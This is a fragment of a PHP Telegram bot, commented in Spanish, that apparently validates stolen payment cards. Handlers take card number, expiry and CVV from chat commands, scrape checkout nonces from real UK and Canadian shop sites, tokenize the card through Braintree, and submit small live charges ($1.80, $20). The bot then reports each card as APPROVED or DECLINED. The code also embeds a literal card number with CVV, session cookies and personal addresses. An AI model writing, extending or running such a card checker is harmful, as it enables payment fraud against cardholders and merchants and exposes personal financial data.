sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; PHPSESSID=219e1f52d6422e534d2371ea41241d60; woocommerce_items_in_cart=1; wp_woocommerce_session_e8067bc7d3b30e6c6ba61052d27f1737=t_9ba71db98f8a23b83246b9a81f591d%7C%7C1726117014%7C%7C1726113414%7C%7C2b17f0d48a34b8bebab8126cfa97159f; __kla_id=eyJlbWFpbCI6InJpZ29qNzc3QGdtYWlsLmNvbSJ9; woocommerce_cart_hash=4958933f2dac9049a052d2576efb347b; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'accept-language: es-US,es;q=0.6',
    'referer: https://www.partyrama.co.uk/themes/first-birthday-boy-party-supplies/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

$patron = '/woocommerce-process-checkout-nonce.*?value="([^"]+)"/';
preg_match($patron, $response, $coincidencia);
$nonce1 = $coincidencia[1];
//echo "($nonce1)\n"; // Salida: c74e67aa43

//d192b23a07


///EXTRAE LAS CONF//
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"822c80e1-9974-46e5-a9dd-0960c57582e4"},"query":"query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }","operationName":"ClientConfiguration"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'authorization: Bearer '.$bear.'',
    'braintree-version: 2018-05-10',
    'origin: https://www.partyrama.co.uk',
    'referer: https://www.partyrama.co.uk/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true); // true convierte el JSON en un a>
curl_close($curl);

$cardinalAuthenticationJWT = $data['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT'];
$googleAuthorization = $data['data']['clientConfiguration']['googlePay']['googleAuthorization'];

$paypalClientId = $data['data']['clientConfiguration']['googlePay']['paypalClientId'];
$clientId = $data['data']['clientConfiguration']['paypal']['clientId'];
$braintreeClientId = $data['data']['clientConfiguration']['paypal']['braintreeClientId'];

//echo "$paypalClientId\n";

///EXTRAE EL TOKEN
$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
//  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"822c80e1-9974-46e5-a9dd-0960c57582e4"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5355842279773621","expirationMonth":"10","expirationYear":"2027","cvv":"588","billingAddress":{"postalCode":"NG17 7WS","streetAddress":"D M Tesseract"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"c60a9304-b8d6-4191-9cf4-cd2775f20ee3"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"EH6 4JL","streetAddress":"10/10 Hawthornvale"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'authorization: Bearer '.$bear.'',
    'braintree-version: 2018-05-10',
    'origin: https://assets.braintreegateway.com',
    'referer: https://assets.braintreegateway.com/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$bin = $json['data']['tokenizeCreditCard']['creditCard']['bin'];
$token = $json['data']['tokenizeCreditCard']['token'];

curl_close($curl);

//echo "Token: $token\n\n";

///EXTRAE EL NONCE
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.braintreegateway.com/merchants/h9rc962wyvrr97jn/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
//  CURLOPT_POSTFIELDS => '{"amount":"1.80","browserColorDepth":24,"browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"es-US","browserScreenHeight":851,"browserScreenWidth":393,"browserTimeZone":360,"deviceChannel":"Browser","additionalInfo":{"shippingGivenName":"","shippingSurname":"Olivia","ipAddress":"138.84.45.137","billingLine1":"D M Tesseract","billingLine2":"PO Box 10800, Kirkby-in-Ashfield","billingCity":"Nottingham","billingState":"","billingPostalCode":"NG17 7WS","billingCountryCode":"GB","billingPhoneNumber":"(416) 831-1335","billingGivenName":"","billingSurname":"Olivia","shippingLine1":"D M Tesseract","shippingLine2":"PO Box 10800, Kirkby-in-Ashfield","shippingCity":"Nottingham","shippingState":"","shippingPostalCode":"NG17 7WS","shippingCountryCode":"GB","email":"gopejob932@ndiety.com"},"bin":"535584","dfReferenceId":"0_0b7161ac-01fb-4cf2-9f98-3259a3c19589","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.106.0","cardinalDeviceDataCollectionTimeElapsed":7,"issuerDeviceDataCollectionTimeElapsed":10067,"issuerDeviceDataCollectionResult":false},"authorizationFingerprint":"'.$bear.'","braintreeLibraryVersion":"braintree/web/3.106.0","_meta":{"merchantAppId":"www.partyrama.co.uk","platform":"web","sdkVersion":"3.106.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"822c80e1-9974-46e5-a9dd-0960c57582e4"}}',
  CURLOPT_POSTFIELDS => '{"amount":"1.80","browserColorDepth":24,"browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"es-US","browserScreenHeight":851,"browserScreenWidth":393,"browserTimeZone":360,"deviceChannel":"Browser","additionalInfo":{"shippingGivenName":"","shippingSurname":"'.$name.'","ipAddress":"'.$ip.'","billingLine1":"10/10 Hawthornvale","billingLine2":"","billingCity":"Edinburgh","billingState":"","billingPostalCode":"EH6 4JL","billingCountryCode":"GB","billingPhoneNumber":"'.$phone.'","billingGivenName":"","billingSurname":"'.$name.'","shippingLine1":"10/10 Hawthornvale","shippingLine2":"","shippingCity":"Edinburgh","shippingState":"","shippingPostalCode":"EH6 4JL","shippingCountryCode":"GB","email":"'.$correo.'"},"bin":"'.$bin.'","dfReferenceId":"0_8c3eb650-aa83-4ade-853a-1a11de9ec092","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.106.0","cardinalDeviceDataCollectionTimeElapsed":588,"issuerDeviceDataCollectionTimeElapsed":10502,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$bear.'","braintreeLibraryVersion":"braintree/web/3.106.0","_meta":{"merchantAppId":"www.partyrama.co.uk","platform":"web","sdkVersion":"3.106.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"c60a9304-b8d6-4191-9cf4-cd2775f20ee3"}}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'origin: https://www.partyrama.co.uk',
    'referer: https://www.partyrama.co.uk/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$nonce = $json['paymentMethod']['nonce'];
//echo "nonce: $nonce\n\n";

curl_close($curl);


///Verifica la Targeta//
$cadena = 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.partyrama.co.uk%2F&wc_order_attribution_session_start_time=2024-09-08+03%3A55%3A13&wc_order_attribution_session_pages=5&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F128.0.0.0+Mobile+Safari%2F537.36&ship_to_different_address=1&shipping_last_name='.$name.'&shipping_phone='.$phone.'&shipping_country=GB&shipping_address_1=D+M+Tesseract&shipping_address_2=PO+Box+10800%2C+Kirkby-in-Ashfield&shipping_city=Nottingham&shipping_postcode=NG17+7WS&order_comments=&billing_last_name='.$name.'&billing_phone='.$phone.'&billing_country=GB&billing_address_1=D+M+Tesseract&billing_address_2=PO+Box+10800%2C+Kirkby-in-Ashfield&billing_city=Nottingham&billing_postcode=NG17+7WS&billing_email='.$correo.'&account_password=&shipping_method%5B0%5D=partyrama_shipping%3Arate%3A14&payment_method=braintree_cc&braintree_cc_nonce_key='.$nonce.'&braintree_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fh9rc962wyvrr97jn%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fh9rc962wyvrr97jn%22%7D%2C%22merchantId%22%3A%22h9rc962wyvrr97jn%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22IE%22%2C%22currencyCode%22%3A%22GBP%22%2C%22merchantIdentifier%22%3A%22h9rc962wyvrr97jn%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22Maestro%22%2C%22UK+Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22".$cardinalAuthenticationJWT."%22%7D%2C%22androidPay%22%3A%7B%22displayName%22%3A%22Partyrama%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22".$googleAuthorization."%22%2C%22paypalClientId%22%3A%22".$paypalClientId."%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Partyrama%22%2C%22clientId%22%3A%22".$clientId."%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22".$braintreeClientId."%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22appartyramacouk%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22GBP%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=&braintree_googlepay_nonce_key=&braintree_googlepay_device_data=&braintree_applepay_nonce_key=&braintree_applepay_device_data=&woocommerce-process-checkout-nonce=36f3fa9339&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review';
$data = str_replace("36f3fa9339", $nonce1, $cadena);

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.partyrama.co.uk?wc-ajax=checkout',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => $data,
  CURLOPT_COOKIE => 'email-section=1; email-only='.$correo.'; email-section=1; delivery-instructions=; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-10%2004%3A54%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-10%2004%3A54%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; PHPSESSID=219e1f52d6422e534d2371ea41241d60; woocommerce_items_in_cart=1; wp_woocommerce_session_e8067bc7d3b30e6c6ba61052d27f1737=t_9ba71db98f8a23b83246b9a81f591d%7C%7C1726117014%7C%7C1726113414%7C%7C2b17f0d48a34b8bebab8126cfa97159f; __kla_id=eyJlbWFpbCI6InJpZ29qNzc3QGdtYWlsLmNvbSJ9; woocommerce_cart_hash=4958933f2dac9049a052d2576efb347b; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
//    'x-requested-with: XMLHttpRequest',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.partyrama.co.uk',
    'referer: https://www.partyrama.co.uk/checkout/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
$mensaje_error = trim(strip_tags($data['messages']));
//--------------------------------------------------
$patron = "/Reason: (.*)/";
preg_match($patron, $mensaje_error, $matches);
$respo = $matches[1];
//--------------------------------------------------
curl_close($curl);

if (empty($respo)) {
$respo = trim(strip_tags($data['messages']));

}


$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if (empty($respo)) {
        $respo = $response;
}
//echo "$respo\n";

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1.80)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your payment method was rejected due to 3D Secure.') !== false || strpos($respo, 'Declined - Call Issuer') !== false || strpos($respo, 'Pick up card - S') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1.80)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1.80)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}





////https://panoramitalia.com/index.php/subscribe/
elseif((strpos($message, "!pa") === 0)||(strpos($message, "/pa") === 0)||(strpos($message, ".pa") === 0)){



$lista = substr($message, 4);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$cvv   = $i[3];

$bin = substr($lista, 0, 6);


////
$num = "$cc$mes$ano$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /pa cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !pa cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .pa cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$binna = json_decode($content,true);
//---------------------------------------------//
$brand = $binna['scheme'];
if (empty($brand)) {
$brand = "Unavailable";
}
$MV = ucwords(strtolower(trim($brand)));


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://panoramitalia.com/index.php/subscribe/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fpanoramitalia.com%2F%3Fwc-ajax%3Dget_refreshed_fragments',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'Upgrade-Insecure-Requests: 1',
    'Accept-Language: es-US,es;q=0.6',
    'Referer: https://panoramitalia.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

$patron = '/name="_cf_verify" value="([^"]+)"/';
preg_match($patron, $response, $coincidencias);
$token = $coincidencias[1];



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://panoramitalia.com/cf-api/CF6317ae143565f',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => [
    '_cf_verify' => ''.$token.'',
    '_wp_http_referer' => '/index.php/subscribe/',
    '_cf_frm_id' => 'CF6317ae143565f',
    '_cf_frm_ct' => '1',
    'cfajax' => 'CF6317ae143565f',
    '_cf_cr_pst' => '335',
    'twitter' => '',
    'fld_1604923' => 'Canada',
    'fld_3782878' => '1 year ($20) - 4 issues',
    'fld_6223773' => 'First time subscription',
    'fld_3249557' => '1',
    'fld_7659764' => ''.$correo.'',
    'fld_5990741' => ''.$cc.'',
    'fld_1615852' => ''.$mes.' / '.$ano.'',
    'fld_4133199' => ''.$cvv.'',
    'fld_2356280' => ''.$MV.'',
    'fld_950613' => ''.$nombre.'',
    'fld_2278346' => ''.$apellido.'',
    'fld_6787259' => ''.$telefono.'',
    'fld_2041995' => 'Canada',
    'fld_5232305' => ''.$direccion1.'',
    'fld_4491871' => ''.$direccion1.'',
    'fld_3911000' => ''.$ciudad.'',
    'fld_2494407' => ''.$zip.'',
    'fld_778305' => 'AZ',
    'fld_4577367' => '20.00',
    'fld_3144093' => 'click',
    'fld_5757786' => ''.$fecha.'',
    'fld_2545505' => '101204525',
    'fld_6974264' => '100',
    'instance' => '1',
    'request' => 'https://panoramitalia.com/cf-api/CF6317ae143565f',
    'formId' => 'CF6317ae143565f',
    'postDisable' => '0',
    'target' => '#caldera_notices_1',
    'loadClass' => 'cf_processing',
    'loadElement' => '_parent',
    'hiderows' => 'true',
    'action' => 'cf_process_ajax_submit',
    'cfajax' => 'CF6317ae143565f',
    'template' => '#cfajax_CF6317ae143565f-tmpl',
  ],
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fpanoramitalia.com%2F%3Fwc-ajax%3Dget_refreshed_fragments',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Origin: https://panoramitalia.com',
    'Referer: https://panoramitalia.com/index.php/subscribe/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
$respo = strip_tags($data['html']);
curl_close($curl);

////EXTRAE EL MENSAJE DE SUSCRPCION////
$partes = explode('.', $respo);
$respo = implode('.', array_slice($partes, 0, 2));
if (!preg_match('/\.$/', $respo)) {
    $respo .= '.';
}

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";



$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if ($respo == 'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.'){
$respo = 'Card Issuer Declined CVV';
}

if (empty($respo)) {
        $respo = $response;
}

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($20)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Transaction refused due to risk model.') !== false) {
